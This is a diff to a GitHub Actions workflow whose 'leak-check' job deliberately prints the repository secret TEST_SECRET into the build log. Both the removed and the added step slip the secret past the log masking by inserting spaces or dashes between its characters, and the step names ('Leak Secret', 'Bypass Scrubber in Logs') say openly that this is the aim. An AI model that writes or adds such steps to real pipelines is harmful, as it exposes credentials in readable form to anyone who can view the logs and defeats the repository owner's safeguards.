@@ -9,16 +9,8 @@ jobs:
   leak-check:
     runs-on: ubuntu-latest
     steps:
-      - name: Leak Secret
+      - name: Bypass Scrubber in Logs
         env:
-          # Ensure this matches your secret name exactly
-          MY_SECRET: ${{ secrets.TEST_SECRET }} 
+          MY_SECRET: ${{ secrets.TEST_SECRET }}
         run: |
-          # If this prints 'MY_SECRET is empty', the secret isn't being passed.
-          if [ -z "$MY_SECRET" ]; then
-            echo "MY_SECRET is empty. Check your secret name or PR source."
-            exit 1
-          fi
-
-          # Bypassing the scrubber by adding spaces between characters
-          echo "Secret spaced out: $(echo $MY_SECRET | sed 's/./& /g')"
+          echo "$MY_SECRET" | sed 's/./&-/g'
